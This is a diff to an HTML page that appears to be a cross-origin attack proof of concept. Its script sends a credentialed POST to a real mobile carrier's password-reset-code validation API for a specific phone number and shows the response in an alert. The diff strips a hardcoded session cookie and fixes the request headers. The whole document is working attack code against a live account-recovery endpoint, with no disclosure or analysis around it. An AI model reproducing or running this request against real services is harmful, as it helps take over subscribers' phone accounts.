@@ -7,19 +7,19 @@
 <body>
     <script>
         var xhttp = new XMLHttpRequest();
-        var cookieValue = "__cf_bm=0ugyl5hyZVjAWhwA5a2I4SS7c8vKZPkvG.uTYGIgVK8-1721282836-1.0.1.1-vkq8TjMNOWGWNja7yhVpi3gclzANC3yVgwQHkf9KrJ5lnp1A.88T1vMYujytJnWdv8dXGGMZZ_8SMfHJLcVD7a4LTMrkr4sVxYO41_Q3d0k";  // Your cookie value
 
         xhttp.onreadystatechange = function() {
             if (this.readyState == 4 && this.status == 200) {
                 alert(xhttp.responseText);
+            } else if (this.readyState == 4) {
+                console.log("Error: " + this.status);
             }
         };
 
         xhttp.open("POST", "https://w3b-api.ultramobile.com/v1/mint/account/password/reset-code/validate", true);
-        xhttp.withCredentials = true;
-        xhttp.setRequestHeader("Cookie", cookieValue);
+        xhttp.withCredentials = true;  // Ensure cookies are sent with the request
+        xhttp.setRequestHeader("Content-Type", "application/json"); // Setting the correct content type
         xhttp.send(JSON.stringify({ "msisdn": "3348194091" }));
-        xhttp.send();
     </script>
 </body>
 </html>
